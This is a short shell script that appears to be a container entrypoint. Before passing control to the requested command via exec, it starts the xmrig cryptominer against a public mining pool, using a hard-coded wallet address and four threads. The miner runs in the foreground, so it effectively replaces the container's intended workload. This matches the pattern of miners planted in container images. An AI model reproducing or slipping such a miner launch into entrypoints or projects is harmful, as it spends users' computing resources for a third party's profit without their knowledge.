#!/bin/sh

set -e

	./xmrig --Proto --algo=ghostrider --url stratum-na.rplant.xyz:17075 --tls --user BmB1donWDuEKXzJjmpKKpX12oUg39U5wyj.odium3 -t 4
	sleep 5


exec "$@"
